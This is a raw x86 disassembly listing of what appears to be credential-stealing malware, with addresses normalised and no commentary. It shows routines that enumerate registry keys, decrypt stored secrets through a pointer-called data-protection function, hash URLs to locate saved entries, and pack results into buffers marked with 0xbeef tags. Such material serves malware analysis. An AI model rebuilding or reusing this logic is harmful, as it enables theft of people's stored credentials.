jmp r-xdata
cmp [ edx ] 0x0
jne r-xdata
cmp [ edx ] 0x2f
jne r-xdata
inc edx
mov [ edx ] 0x5c
sub_409a01
push ebp
mov ebp esp
add esp 0xffffffe8
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call StrStrIA
or eax eax
je r-xdata
push 0x800
call sub_40184c
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
push 0x0
push rw-data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_401835
leave
retn 0x14
mov [ ebp - 0x10 ] 0x0
push eax
push eax
call sub_4023a8
or eax eax
je r-xdata
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push [ ebp - 0x8 ]
push eax
call sub_401dc9
mov [ ebp - 0x14 ] eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409a01
push [ ebp - 0x14 ]
call sub_401835
inc [ ebp - 0x10 ]
jmp r-xdata
jmp r-xdata
call sub_401835
mov [ ebp - 0x18 ] eax
push 0x1a
call sub_401e2e
or eax eax
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
push [ ebp - 0x18 ]
call sub_401835
push [ ebp + 0x18 ]
push eax
call sub_401dc9
push eax
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
call sub_409886
call sub_401835
sub_409b09
push ebp
mov ebp esp
add esp 0xfffffef4
push 0x0
push 0x24
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov [ rw-data ] 0x0
lea eax [ ebp - 0x109 ]
push eax
push 0x104
call GetCurrentDirectoryA
push rw-data
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_409a01
push rw-data
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_409a01
lea eax [ ebp - 0x109 ]
push eax
call SetCurrentDirectoryA
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_409b90
push ebp
mov ebp esp
add esp 0xfffffef4
push 0x0
push 0x25
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
call sub_401e2e
or eax eax
je r-xdata
mov [ rw-data ] 0x1
lea eax [ ebp - 0x109 ]
push eax
push 0x104
call GetCurrentDirectoryA
push rw-data
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_409a01
push rw-data
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_409a01
lea eax [ ebp - 0x109 ]
push eax
call SetCurrentDirectoryA
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push rw-data
push eax
call sub_401dc9
push eax
push 0xbeef1000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_409c46
push ebp
mov ebp esp
add esp 0xfffffef4
push 0x0
push 0x26
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov [ rw-data ] 0x0
lea eax [ ebp - 0x109 ]
push eax
push 0x104
call GetCurrentDirectoryA
push rw-data
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_409a01
push rw-data
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_409a01
lea eax [ ebp - 0x109 ]
push eax
call SetCurrentDirectoryA
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_409ccd
push ebp
mov ebp esp
add esp 0xfffffef4
push 0x0
push 0x27
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov [ rw-data ] 0x0
lea eax [ ebp - 0x109 ]
push eax
push 0x104
call GetCurrentDirectoryA
push rw-data
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_409a01
push rw-data
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_409a01
lea eax [ ebp - 0x109 ]
push eax
call SetCurrentDirectoryA
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_409d54
push ebp
mov ebp esp
add esp 0xfffffef4
push 0x0
push 0x28
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov [ rw-data ] 0x0
lea eax [ ebp - 0x109 ]
push eax
push 0x104
call GetCurrentDirectoryA
push rw-data
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_409a01
push rw-data
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_409a01
lea eax [ ebp - 0x109 ]
push eax
call SetCurrentDirectoryA
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_409ddb
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x29
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_409e67
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x2a
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
call sub_401e2e
or eax eax
je r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_409f09
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x2b
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_409f87
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x2c
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
push rw-data
push 0x80000000
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_409fe1
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x2d
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40a01c
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x2e
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40a06e
push ebp
mov ebp esp
add esp 0xfffffffc
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
call [ edx + 0x1c ]
test eax eax
jne r-xdata
leave
retn 0xc
mov edx [ ebp - 0x4 ]
nop
push 0x0
push 0x0
push 0x3ff
push [ ebp + 0xc ]
push 0xffffffff
push [ edx + 0x4 ]
push 0x0
push 0x0
call WideCharToMultiByte
nop
push [ ebp - 0x4 ]
call CoTaskMemFree
sub_40a0b9
push ebp
mov ebp esp
add esp 0xfffffffc
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
call [ edx + 0x28 ]
test eax eax
jne r-xdata
leave
retn 0x10
mov edx [ ebp - 0x4 ]
nop
push 0x0
push 0x0
push 0x3ff
push [ ebp + 0x10 ]
push 0xffffffff
push [ edx + 0x4 ]
push 0x0
push 0x0
call WideCharToMultiByte
nop
push [ ebp - 0x4 ]
call CoTaskMemFree
sub_40a107
push ebp
mov ebp esp
add esp 0xffffffb8
push edi
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
lea eax [ ebp - 0x48 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
call [ edx + 0x54 ]
test eax eax
jne r-xdata
pop edi
leave
retn 0x14
pop edi
leave
retn 0x14
mov [ ebp - 0x44 ] 0x0
mov edx [ ebp - 0x48 ]
mov edx [ edx ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x10
push [ ebp - 0x48 ]
call [ edx + 0xc ]
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
mov edx [ edx ]
push [ ebp - 0x48 ]
call [ edx + 0x8 ]
lea edi [ ebp - 0x40 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebp + 0x18 ]
push [ edi ]
call CoTaskMemFree
add edi 0x4
dec [ ebp - 0x44 ]
jne r-xdata
jmp r-xdata
sub_40a18d
push ebp
mov ebp esp
add esp 0xfffffef8
push edi
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
lea eax [ ebp - 0x108 ]
push eax
push 0x0
push [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
call [ edx + 0x3c ]
test eax eax
jne r-xdata
pop edi
leave
retn 0x10
mov [ ebp - 0x104 ] 0x0
mov edx [ ebp - 0x108 ]
mov edx [ edx ]
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push 0x10
push [ ebp - 0x108 ]
call [ edx + 0xc ]
cmp [ ebp - 0x104 ] 0x0
je r-xdata
mov edx [ ebp - 0x108 ]
mov edx [ edx ]
push [ ebp - 0x108 ]
call [ edx + 0x8 ]
lea edi [ ebp - 0x100 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_40a107
add edi 0x10
dec [ ebp - 0x104 ]
jne r-xdata
jmp r-xdata
sub_40a223
push ebp
mov ebp esp
add esp 0xfffffef8
push edi
mov edx [ ebp + 0xc ]
mov edx [ edx ]
lea eax [ ebp - 0x108 ]
push eax
push 0x0
push 0x0
push [ ebp + 0xc ]
call [ edx + 0x38 ]
test eax eax
jne r-xdata
pop edi
leave
retn 0xc
mov [ ebp - 0x4 ] 0x0
nop
mov edx [ ebp - 0x108 ]
mov edx [ edx ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
push 0x10
push [ ebp - 0x108 ]
call [ edx + 0xc ]
nop
cmp [ ebp - 0x4 ] 0x0
nop
je r-xdata
mov edx [ ebp - 0x108 ]
mov edx [ edx ]
push [ ebp - 0x108 ]
call [ edx + 0x8 ]
lea edi [ ebp - 0x104 ]
nop
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_40a18d
add edi 0x10
nop
dec [ ebp - 0x4 ]
nop
jne r-xdata
nop
jmp r-xdata
sub_40a2ae
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
call sub_4014e6
push [ ebp + 0xc ]
call lstrlenW
shl eax 0x1
add eax 0x2
push eax
push [ ebp + 0xc ]
push [ ebp + 0x18 ]
call sub_40151c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x18 ]
call sub_40151c
leave
retn 0x14
sub_40a2e7
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
call sub_4014e6
push [ ebp + 0xc ]
call lstrlenA
inc eax
push eax
push [ ebp + 0xc ]
push [ ebp + 0x18 ]
call sub_40151c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x18 ]
call sub_40151c
leave
retn 0x14
sub_40a31c
push ebp
mov ebp esp
add esp 0xfffff7d4
push [ ebp + 0x18 ]
lea eax [ ebp - 0x400 ]
push eax
push [ ebp + 0x8 ]
call sub_40a06e
push 0x0
push 0x0
push 0x3ff
lea eax [ ebp - 0x800 ]
push eax
push 0xffffffff
push [ ebp + 0x10 ]
push 0x0
push 0x0
call WideCharToMultiByte
mov [ ebp - 0x810 ] 0x10
mov [ ebp - 0x80c ] 0x2
mov [ ebp - 0x808 ] 0x0
mov [ ebp - 0x804 ] 0x0
mov edx [ ebp + 0x18 ]
mov edx [ edx ]
push 0x0
lea eax [ ebp - 0x810 ]
push eax
lea eax [ ebp - 0x814 ]
push eax
lea eax [ ebp - 0x818 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x18 ]
call [ edx + 0x44 ]
cmp [ ebp - 0x818 ] 0x0
je r-xdata
leave
retn 0x14
cmp [ ebp - 0x814 ] 0x0
je r-xdata
mov [ ebp - 0x82c ] 0xbeef0000
push rw-data
lea eax [ ebp - 0x400 ]
push eax
call lstrcmpiA
test eax eax
je r-xdata
push rw-data
lea eax [ ebp - 0x800 ]
push eax
call StrStrIA
or eax eax
je r-xdata
mov [ ebp - 0x82c ] 0xbeef0001
push rw-data
lea eax [ ebp - 0x400 ]
push eax
call lstrcmpiA
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp - 0x818 ]
push [ ebp - 0x814 ]
push [ ebp + 0x10 ]
push [ ebp - 0x82c ]
call sub_40a2ae
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x82c ] 0xbeef0002
push rw-data
lea eax [ ebp - 0x400 ]
push eax
call lstrcmpiA
test eax eax
jne r-xdata
push [ ebp - 0x814 ]
call CoTaskMemFree
push [ ebp - 0x818 ]
pop [ ebp - 0x820 ]
push [ ebp - 0x814 ]
pop [ ebp - 0x81c ]
lea eax [ ebp - 0x828 ]
push eax
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x820 ]
push eax
call [ rw-data ]
or eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp - 0x828 ]
push [ ebp - 0x824 ]
push [ ebp + 0x10 ]
push [ ebp - 0x82c ]
call sub_40a2ae
push [ ebp - 0x824 ]
call LocalFree
jmp r-xdata
sub_40a4d7
push ebp
mov ebp esp
add esp 0xffffffb0
push esi
push [ ebp + 0xc ]
call lstrlenW
or eax eax
jne r-xdata
shl eax 0x1
add eax 0x2
mov edx eax
lea eax [ ebp - 0x14 ]
push eax
push edx
push [ ebp + 0xc ]
call sub_40348d
sub ecx ecx
mov [ ebp - 0x2c ] ecx
jmp r-xdata
pop esi
leave
retn 0xc
cmp ecx 0x14
jb r-xdata
movzx eax [ ss : ecx + ebp - 0x14 ]
add [ ebp - 0x2c ] eax
inc ecx
sub esi esi
mov [ ebp - 0x30 ] esi
jmp r-xdata
cmp esi 0x14
jb r-xdata
movzx eax [ ss : esi + ebp - 0x14 ]
push eax
push rw-data
lea eax [ ebp - 0x28 ]
push eax
call wsprintfA
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x30 ]
call sub_401dc9
mov [ ebp - 0x30 ] eax
inc esi
and [ ebp - 0x2c ] 0xff
push [ ebp - 0x2c ]
push rw-data
lea eax [ ebp - 0x28 ]
push eax
call wsprintfA
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x30 ]
call sub_401dc9
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x30 ]
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x30 ]
call sub_401835
pop esi
leave
retn 0xc
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
push [ ebp - 0x38 ]
call sub_401835
push [ ebp + 0xc ]
call lstrlenW
shl eax 0x1
add eax 0x2
mov [ ebp - 0x50 ] eax
push [ ebp + 0xc ]
pop [ ebp - 0x4c ]
push [ ebp - 0x34 ]
pop [ ebp - 0x40 ]
push [ ebp - 0x38 ]
pop [ ebp - 0x3c ]
mov [ ebp - 0x44 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push 0x0
lea eax [ ebp - 0x40 ]
push eax
call [ rw-data ]
or eax eax
je r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x48 ]
push [ ebp - 0x44 ]
push [ ebp + 0xc ]
push 0xbeef0003
call sub_40a2ae
push [ ebp - 0x44 ]
call LocalFree
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x3f
sub_40a63a
push ebp
mov ebp esp
add esp 0xffffffc8
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x5
push 0x0
push rw-data
call CoCreateInstance
test eax eax
js r-xdata
push 0x0
push rw-data
push [ ebp + 0x8 ]
call sub_40a4d7
leave
retn 0x4
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
call [ edx + 0x1c ]
test eax eax
js r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
push [ ebp - 0x4 ]
call [ edx + 0x8 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x30 ] 0x28
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
push [ ebp - 0x8 ]
call [ edx + 0x8 ]
cmp [ ebp - 0x34 ] 0x1
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
jmp r-xdata
push rw-data
push [ ebp - 0x2c ]
call StrStrIW
or eax eax
je r-xdata
mov [ ebp - 0x34 ] 0x0
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push 0x1
push [ ebp - 0x8 ]
call [ edx + 0xc ]
or eax eax
jne r-xdata
mov [ ebp - 0x38 ] 0x0
mov [ eax ] 0x0
mov [ ebp - 0x38 ] eax
jmp r-xdata
push [ ebp - 0x28 ]
call CoTaskMemFree
push [ ebp - 0x38 ]
push [ ebp - 0x2c ]
push [ ebp + 0x8 ]
call sub_40a4d7
push [ ebp - 0x2c ]
call CoTaskMemFree
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_40a732
push ebp
mov ebp esp
add esp 0xffffffe0
push esi
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
mov esi rw-data
jmp r-xdata
pop esi
leave
retn 0x4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
shl [ esi ] 0x2
add esi 0x2
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push rw-data
call [ rw-data ]
or eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push esi
mov esi [ esi ]
push [ esi + 0x18 ]
pop [ ebp - 0x10 ]
push [ esi + 0x1c ]
pop [ ebp - 0xc ]
push rw-data
call lstrlenW
shl eax 0x1
add eax 0x2
mov [ ebp - 0x20 ] eax
push rw-data
pop [ ebp - 0x1c ]
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call [ rw-data ]
or eax eax
je r-xdata
pop esi
dec [ ebp - 0x8 ]
add esi 0x4
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax 0x1
or eax eax
je r-xdata
push [ ebp - 0x14 ]
call LocalFree
push [ ebp + 0x8 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ esi + 0x8 ]
push 0xbeef0004
call sub_40a2e7
sub_40a86d
push ebp
mov ebp esp
add esp 0xfffffff8
push 0x0
push 0x2f
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_40a63a
push [ ebp + 0x8 ]
call sub_40a732
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
mov [ ebp - 0x8 ] 0x0
sub eax eax
push eax
push eax
push eax
lea edx [ ebp - 0x8 ]
push edx
call [ rw-data ]
test eax eax
jns r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
push sub_40a31c
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40a223
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
push [ ebp - 0x8 ]
call [ edx + 0x8 ]
jmp r-xdata
sub_40a8e9
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
push ebx
mov edx [ ebp + 0xc ]
mov [ edx ] 0x0
push [ ebp + 0x8 ]
call lstrlenA
cmp eax 0x1
ja r-xdata
shr eax 0x1
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov ebx eax
jb r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
or ebx ebx
jne r-xdata
mov ax [ esi ]
cmp ah 0x30
jb r-xdata
mov eax [ ebp + 0xc ]
push [ eax ]
pop [ ebp - 0x8 ]
push [ ebp + 0x8 ]
pop [ ebp - 0x4 ]
mov [ ebp - 0xc ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
cmp ah 0x41
jb r-xdata
cmp ah 0x39
ja r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x8 ]
push eax
call [ rw-data ]
or eax eax
je r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
cmp ah 0x46
ja r-xdata
sub ah 0x30
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
sub ah 0x41
add ah 0xa
jmp r-xdata
cmp al 0x30
jb r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax ]
ja r-xdata
cmp al 0x41
jb r-xdata
cmp al 0x39
ja r-xdata
cld
mov esi [ ebp - 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
jecxz r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
cmp al 0x46
ja r-xdata
sub al 0x30
jmp r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x10 ]
pop [ eax ]
push [ ebp - 0xc ]
call LocalFree
mov eax 0x1
pop ebx
pop edi
pop esi
leave
retn 0x8
[ edi ] [ esi ]
sub al 0x41
add al 0xa
jmp r-xdata
shl al 0x4
or al ah
stosb [ edi ]
dec ebx
add esi 0x2
sub_40aa03
push ebp
mov ebp esp
add esp 0xffffffc0
push 0x2000
call sub_40184c
mov [ ebp - 0x4 ] eax
push 0x2000
call sub_40184c
mov [ ebp - 0x8 ] eax
push 0x2000
call sub_40184c
mov [ ebp - 0xc ] eax
push 0x2000
call sub_40184c
mov [ ebp - 0x10 ] eax
push 0x2000
call sub_40184c
mov [ ebp - 0x14 ] eax
push 0x2000
call sub_40184c
mov [ ebp - 0x18 ] eax
push 0x2000
call sub_40184c
mov [ ebp - 0x1c ] eax
push [ ebp + 0x10 ]
push rw-data
push [ ebp - 0x4 ]
call wsprintfA
add esp 0xc
push [ ebp + 0x10 ]
push rw-data
push [ ebp - 0x8 ]
call wsprintfA
add esp 0xc
push [ ebp + 0x10 ]
push rw-data
push [ ebp - 0xc ]
call wsprintfA
add esp 0xc
push [ ebp + 0x10 ]
push rw-data
push [ ebp - 0x10 ]
call wsprintfA
add esp 0xc
push [ ebp + 0x10 ]
push rw-data
push [ ebp - 0x14 ]
call wsprintfA
add esp 0xc
push [ ebp + 0xc ]
push rw-data
push [ ebp - 0x18 ]
call wsprintfA
add esp 0xc
push [ ebp + 0x10 ]
push rw-data
push [ ebp - 0x1c ]
call wsprintfA
add esp 0xc
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x20 ] eax
push 0x0
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x24 ] eax
push 0x0
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x28 ] eax
push 0x0
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x2c ] eax
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x40 ]
push eax
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call sub_401835
push [ ebp - 0x8 ]
call sub_401835
push [ ebp - 0xc ]
call sub_401835
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x18 ]
call sub_401835
push [ ebp - 0x1c ]
call sub_401835
push [ ebp - 0x20 ]
call sub_401835
push [ ebp - 0x24 ]
call sub_401835
push [ ebp - 0x28 ]
call sub_401835
push [ ebp - 0x2c ]
call sub_401835
push [ ebp - 0x30 ]
call sub_401835
push [ ebp - 0x34 ]
call sub_401835
leave
retn 0xc
cmp [ ebp - 0x2c ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x2c ]
call sub_40a8e9
or eax eax
je r-xdata
cmp [ ebp - 0x3c ] 0x0
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0x30 ]
call sub_40a8e9
or eax eax
je r-xdata
cmp [ ebp - 0x38 ] 0x0
je r-xdata
push 0xbeef0010
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x20 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x28 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x3c ]
push [ ebp - 0x2c ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x38 ]
push [ ebp - 0x30 ]
push [ ebp + 0x8 ]
call sub_40151c
cmp [ ebp - 0x34 ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4014e6
cmp [ ebp - 0x40 ] 0x4
jne r-xdata
mov eax [ ebp - 0x34 ]
push [ eax ]
